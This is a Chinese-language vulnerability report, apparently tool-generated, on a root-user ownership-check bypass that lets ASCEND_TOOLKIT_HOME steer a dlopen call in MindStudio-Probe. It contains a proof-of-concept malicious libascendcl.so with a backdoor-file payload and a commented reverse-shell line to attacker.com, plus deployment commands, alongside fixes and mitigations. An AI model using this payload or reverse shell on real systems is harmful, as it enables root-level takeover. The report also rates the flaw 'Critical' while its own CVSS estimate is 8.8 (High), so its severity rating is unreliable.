# SEC-DLOPEN-ROOT-BYPASS-001：GetCurrentDeviceId dlopen环境变量控制致root权限绕过

## 漏洞基本信息

| 属性 | 值 |
|------|-----|
| 漏洞 ID | SEC-DLOPEN-ROOT-BYPASS-001 |
| CWE | CWE-250 (Execution with Unnecessary Privileges) |
| 严重性 | **Critical** |
| 置信度 | 95% |
| 类型 | privilege_bypass |
| 模块 | atb_probe |
| 文件 | ccsrc/atb_probe/atb_probe.cpp |
| 行号 | 179 |
| 函数 | GetCurrentDeviceId() |

## 漏洞详情

### 漏洞代码

```cpp
static int32_t GetCurrentDeviceId()
{
    int32_t deviceId = -1;
    const char* ascendToolkitHome = std::getenv(ASCEND_TOOLKIT_HOME);  // 从环境变量获取路径
    if (ascendToolkitHome == nullptr) { return deviceId; }
    
    std::string ascendclPath = std::string(ascendToolkitHome) + "/lib64/" + LIBASCENDCL_SO;
    struct stat fileStat;
    if (stat(ascendclPath.c_str(), &fileStat) != 0) { return deviceId; }
    
    // 🔴 漏洞点：当 uid=0 (root) 时，整个检查被跳过
    if (getuid() != 0 && fileStat.st_uid != getuid()) { return deviceId; }
    
    mode_t permissions = fileStat.st_mode & (S_IRWXU | S_IRWXG | S_IRWXO);
    if ((permissions & MsConst::READ_FILE_NOT_PERMITTED) > 0) { return deviceId; }
    
    void* handle = dlopen(ascendclPath.c_str(), RTLD_LAZY);  // 加载库
    if (handle == nullptr) { return deviceId; }
    
    int (*getDeviceFunc)(int32_t*) = reinterpret_cast<int (*)(int32_t*)>(dlsym(handle, "aclrtGetDevice"));
    ...
}
```

### 漏洞根因分析

**第 179 行的条件判断存在逻辑缺陷：**

```cpp
if (getuid() != 0 && fileStat.st_uid != getuid()) { return deviceId; }
```

**逻辑分析：**
- 当进程以普通用户运行时（uid != 0）：检查库文件是否属于当前用户
- 当进程以 **root 用户运行时**（uid == 0）：
  - `getuid() != 0` 为 `false`
  - 整个条件为 `false && ...` = `false`
  - **所有者检查被完全跳过！**

**设计意图 vs 实际效果：**
- 设计意图：确保加载的库文件属于当前用户，防止加载恶意库
- 实际效果：root 用户可以加载 **任意用户拥有的库文件**，完全绕过安全检查

### 数据流路径

```
ASCEND_TOOLKIT_HOME (环境变量) 
    ↓
ascendclPath = $ASCEND_TOOLKIT_HOME/lib64/libascendcl.so
    ↓
stat() 获取文件信息
    ↓
[漏洞点] if (getuid() != 0 && ...) → root 用户时检查被跳过
    ↓
dlopen(ascendclPath) 加载库
    ↓
dlsym() 获取函数指针
    ↓
执行库中的任意代码
```

## 利用条件

### 必要条件

1. **进程以 root 权限运行**
   - MindStudio-Probe 可能以 root 运行（例如作为系统服务、容器内、或通过 sudo）
   
2. **攻击者可控制 ASCEND_TOOLKIT_HOME 环境变量**
   - 通过环境变量注入（例如 ~/.bashrc、/etc/environment）
   - 通过容器配置
   - 通过启动脚本
   
3. **攻击者可放置恶意库文件**
   - 在任意目录创建 `lib64/libascendcl.so`
   - 文件权限检查仍然存在，但攻击者控制的目录可以满足

### 利用场景

#### 场景 1：服务部署环境
MindStudio-Probe 作为系统服务以 root 运行：
```bash
# 攻击者修改环境变量配置
echo 'export ASCEND_TOOLKIT_HOME=/tmp/malicious' >> /etc/environment

# 攻击者放置恶意库
mkdir -p /tmp/malicious/lib64
gcc -shared -fPIC -o /tmp/malicious/lib64/libascendcl.so malicious.c

# 服务重启后加载恶意库，执行任意代码
```

#### 场景 2：容器环境
容器内以 root 运行，攻击者控制容器配置：
```yaml
# docker-compose.yml 或 pod 配置
environment:
  - ASCEND_TOOLKIT_HOME=/attacker-path
volumes:
  - ./malicious-lib:/attacker-path/lib64/libascendcl.so
```

#### 场景 3：共享环境
多用户共享服务器，某个用户有 sudo 权限运行 MindStudio：
```bash
# 普通用户 A 创建恶意库
mkdir -p ~/malicious/lib64
gcc -shared -fPIC -o ~/malicious/lib64/libascendcl.so malicious.c

# 修改自己的环境变量
export ASCEND_TOOLKIT_HOME=~/malicious

# 当管理员或用户 A 使用 sudo 运行 MindStudio 时
sudo mindstudio-probe  # 以 root 加载 ~/malicious/lib64/libascendcl.so
```

## PoC 构思路

### 恶意库示例代码

```c
// malicious_libascendcl.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 模拟 aclrtGetDevice 函数
int aclrtGetDevice(int* deviceId) {
    // 执行恶意操作
    printf("[MALICIOUS] Library loaded! Executing payload...\n");
    
    // 示例 payload：创建后门文件
    system("echo 'backdoor' > /tmp/backdoor.txt");
    
    // 示例 payload：反弹 shell（实际攻击中更隐蔽）
    // system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'");
    
    // 返回正常响应以避免引起注意
    *deviceId = 0;
    return 0;
}

// 库加载时自动执行
__attribute__((constructor))
void on_load() {
    printf("[MALICIOUS] Constructor executed!\n");
    // 可以在这里执行更隐蔽的恶意操作
}
```

### 编译与部署

```bash
# 编译恶意库
gcc -shared -fPIC -o libascendcl.so malicious_libascendcl.c

# 创建目录结构
mkdir -p /tmp/attack/lib64
cp libascendcl.so /tmp/attack/lib64/

# 设置环境变量
export ASCEND_TOOLKIT_HOME=/tmp/attack

# 运行目标程序（以 root）
sudo ./mindstudio-probe

# 结果：恶意库被加载，constructor 自动执行
```

### 验证步骤

1. 以 root 权限运行程序
2. 设置 ASCEND_TOOLKIT_HOME 指向攻击者控制的目录
3. 触发 GetCurrentDeviceId() 函数（可能通过正常操作）
4. 检查恶意代码是否执行（例如检查 /tmp/backdoor.txt）

## 影响范围

### 直接影响

- **任意代码执行**：以 root 权限执行任意代码
- **完全系统控制**：安装后门、窃取数据、横向移动
- **权限提升持久化**：创建新的 root 用户、修改 sudoers

### 间接影响

- **供应链攻击**：如果 MindStudio-Probe 是更大型系统的组件
- **数据泄露**：访问所有用户数据、敏感配置
- **系统破坏**：删除文件、修改系统配置

### 受影响组件

| 组件 | 影响 |
|------|------|
| MindStudio-Probe 核心功能 | 完全被控制 |
| 依赖此库的所有服务 | 连带受影响 |
| AI 模型处理流程 | 数据可被窃取/篡改 |

## 风险评估

### CVSS 评分估算

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Local | 需要本地访问或环境变量控制 |
| Attack Complexity (AC) | Low | 无需特殊条件，只需控制环境变量 |
| Privileges Required (PR) | Low | 需要有能力设置环境变量 |
| User Interaction (UI) | None | 无需用户交互 |
| Scope (S) | Changed | 可影响系统其他组件 |
| Confidentiality (C) | High | root 权限可访问所有数据 |
| Integrity (I) | High | root 权限可修改所有文件 |
| Availability (A) | High | 可导致系统完全不可用 |

**估算 CVSS 3.1 评分：8.8 (High)**

### 风险等级

**Critical** - 虽然需要 root 运行条件，但在该场景下可实现完全系统控制

## 缓解建议

### 立即修复（代码层面）

**修复方案 1：root 用户也需要检查**

```cpp
// 原代码
if (getuid() != 0 && fileStat.st_uid != getuid()) { return deviceId; }

// 修复后：root 用户应检查库文件属于 root 或受信任用户
if (getuid() == 0) {
    // root 用户：只允许加载属于 root 的库，或严格白名单目录
    if (fileStat.st_uid != 0) {
        // 检查是否在白名单目录
        std::string allowedPath = GetRealPath(ascendclPath);
        if (!IsInAllowedDirectory(allowedPath)) {
            return deviceId;
        }
    }
} else {
    // 普通用户：检查库文件属于当前用户
    if (fileStat.st_uid != getuid()) { return deviceId; }
}
```

**修复方案 2：使用绝对路径白名单**

```cpp
// 不依赖环境变量，使用硬编码或配置文件中的白名单路径
static const std::vector<std::string> ALLOWED_LIBRARY_PATHS = {
    "/usr/local/Ascend/lib64/libascendcl.so",
    "/opt/Ascend/lib64/libascendcl.so",
};

for (const auto& allowedPath : ALLOWED_LIBRARY_PATHS) {
    if (ascendclPath == allowedPath && stat(allowedPath.c_str(), &fileStat) == 0) {
        // 验证文件所有权和权限
        if (ValidateLibraryOwnership(allowedPath, fileStat)) {
            void* handle = dlopen(allowedPath.c_str(), RTLD_LAZY);
            ...
        }
    }
}
```

**修复方案 3：使用 realpath 解析并验证**

```cpp
std::string realPath = GetRealPath(ascendclPath);
if (realPath.empty()) { return deviceId; }

// 检查 resolved path 是否在受信任目录
if (!realPath.starts_with("/usr/local/Ascend/") && 
    !realPath.starts_with("/opt/Ascend/")) {
    return deviceId;
}
```

### 配置层面缓解

1. **避免以 root 运行**
   ```bash
   # 创建专用用户
   sudo useradd -r -s /bin/false mindstudio
   sudo chmod 750 /opt/mindstudio
   # 以专用用户运行服务
   ```

2. **锁定环境变量**
   ```bash
   # 在服务配置中硬编码 ASCEND_TOOLKIT_HOME
   # 不允许用户修改
   ASCEND_TOOLKIT_HOME=/opt/Ascend
   ```

3. **SELinux/AppArmor 限制**
   ```bash
   # 限制 dlopen 可加载的路径
   # 只允许从受信任目录加载库
   ```

### 运维建议

1. **审计检查**
   ```bash
   # 检查是否有异常 ASCEND_TOOLKIT_HOME 设置
   grep -r ASCEND_TOOLKIT_HOME /etc/ ~/.bashrc ~/.bash_profile
   
   # 检查 libascendcl.so 的位置和所有权
   find / -name "libascendcl.so" -exec ls -la {} \;
   ```

2. **监控加载的库**
   ```bash
   # 使用 strace 或 LD_DEBUG 监控 dlopen
   strace -e openat ./mindstudio-probe
   ```

## 相关漏洞

| ID | 关系 | 说明 |
|-----|------|------|
| atb_probe_cwe426_dlopen_001 | **重复** | 同一漏洞的不同报告视角 |
| CWE-426 | 相关 | Untrusted Search Path |
| CWE-250 | 主体 | Execution with Unnecessary Privileges |

## 总结

这是一个**设计缺陷导致的权限绕过漏洞**。代码作者试图通过所有权检查保护 dlopen 安全性，但忽略了 root 用户场景，导致 root 用户反而失去了安全保护。在实际部署中，如果 MindStudio-Probe 以 root 运行（这在 AI 基础设施中很常见），攻击者只需控制环境变量即可实现**完全系统控制**。

---

**报告生成时间**: 2026-04-21  
**分析者**: details-analyzer (协调者本地分析)  
**状态**: CONFIRMED - 真实漏洞